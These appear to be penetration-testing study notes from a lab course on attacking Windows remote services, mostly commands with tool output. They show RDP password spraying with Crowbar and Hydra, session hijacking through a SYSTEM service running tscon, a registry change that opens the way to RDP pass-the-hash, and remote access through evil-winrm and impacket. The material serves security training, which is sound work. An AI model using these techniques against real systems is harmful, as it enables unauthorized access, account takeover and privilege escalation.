# Windows Remote Services

#### RDP

```shell
nmap -Pn -p3389 192.168.2.143 
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

**Password Spraying**

Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file.

**Crowbar - RDP Password Spraying**

```shell
lojique@htb[/htb]$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

We can also use `Hydra` to perform an RDP password spray attack.

**Hydra - RDP Password Spraying**

```shell-session
lojique@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.

```shell
lojique@htb[/htb]$ sudo cpan

Loading internal logger. Log::Log4perl recommended for better logging

CPAN.pm requires configuration, but most of it can be done automatically.
If you answer 'no' below, you will enter an interactive dialog for each
configuration option instead.

Would you like to configure as much as possible automatically? [yes] yes


Autoconfiguration complete.

commit: wrote '/root/.cpan/CPAN/MyConfig.pm'

You can re-run configuration any time with 'o conf init' in the CPAN shell

cpan shell -- CPAN exploration and modules installation (v2.27)
Enter 'h' for help.


cpan[1]> install Encoding::BER

Fetching with LWP:
http://www.cpan.org/authors/01mailrc.txt.gz
Reading '/root/.cpan/sources/authors/01mailrc.txt.gz'
............................................................................DONE
...SNIP...

git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

**RDP Login**

Authentication and connection to such RDP servers can be made in several ways. For example, we can connect to RDP servers on Linux using `xfreerdp`, `rdesktop`, or `Remmina` and interact with the GUI of the server accordingly.

```shell
xfreerdp /u:cry0l1t3 /p:'P455w0rd!' /v:10.129.201.248
rdesktop -u admin -p password123 192.168.2.143
```

**Protocol Specific Attacks**

Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.

**RDP Session Hijacking**

As shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP. !\[\[rdp\_session-1-2.jpg]]

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

```powershell
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"

[SC] CreateService SUCCESS
```

!\[\[rdp\_session-2-2.jpg]]

To run the command, we can start the `sessionhijack` service :

```cmd-session
C:\htb> net start sessionhijack
```

Once the service is started, a new terminal with the `lewen` user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.

!\[\[rdp\_session-3-2.jpg]]

> _Note: This method no longer works on Server 2019._

**RDP Pass-the-Hash (PtH)**

In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

* `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error: !\[\[rdp\_session-4.png]]

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

```powershell
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

!\[\[rdp\_session-5.png]] Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.

#### WinRM

```shell
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

#### WMI

The initialization of the WMI communication always takes place on `TCP` port `135`, and after the successful establishment of the connection, the communication is moved to a random port.

```shell
impacket-wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```
